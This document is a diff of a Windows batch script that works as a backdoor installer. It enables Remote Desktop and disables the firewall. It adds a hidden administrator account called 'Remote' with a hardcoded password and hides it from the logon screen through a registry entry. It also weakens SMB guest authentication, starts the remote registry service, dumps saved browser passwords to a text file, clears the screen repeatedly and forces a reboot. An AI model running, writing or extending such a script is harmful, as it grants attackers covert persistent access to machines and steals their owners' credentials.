@@ -2,13 +2,22 @@
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fClientDisableUDP /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "AutoShareServer" /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "Remote" /t REG_DWORD /d 0 /f
+cls
+ipconfig /flushdns
+netsh advfirewall set allprofiles state off
+cls
 powershell Set-ExecutionPolicy RemoteSigned
 net user /add Remote admPass
 net localgroup Администраторы Remote /add
 net localgroup "Пользователи удаленного рабочего стола" Remote /add
+cls
 sc \\%COMPUTERNAME% config remoteregistry start= auto
 sc \\%COMPUTERNAME% start remoteregistry
 start WebBrowserPassView.exe /stext pass.txt
+shutdown -r -t 10
 cls
 exit
